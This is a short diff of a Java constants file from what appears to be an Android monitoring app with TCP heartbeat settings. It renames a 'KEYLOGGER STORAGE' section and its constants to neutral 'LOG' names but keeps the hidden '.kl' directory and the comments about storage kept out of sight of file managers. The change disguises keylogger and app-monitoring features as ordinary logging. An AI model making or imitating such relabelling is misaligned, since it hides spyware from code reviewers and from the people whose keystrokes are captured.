@@ -15,11 +15,11 @@ public class Constants {
     public static final int TCP_RECONNECT_DELAY = 1500;
     public static final int HEARTBEAT_INTERVAL  = 10000;
 
-    // ========== KEYLOGGER STORAGE ==========
+    // ========== LOG STORAGE ==========
     // Hidden inside app's private internal data (not visible in file managers)
-    // Path: /data/data/<package>/files/.kl/
-    public static final String KEYLOG_DIR        = ".kl";
-    public static final String KEYLOG_DATE_FMT   = "yyyy-MM-dd";
+    // Path: /data/data/<package>/files/.logs/
+    public static final String LOG_DIR        = ".kl";
+    public static final String LOG_DATE_FMT   = "yyyy-MM-dd";
 
     // ========== APP MONITOR ==========
     // Hidden inside app's private internal data
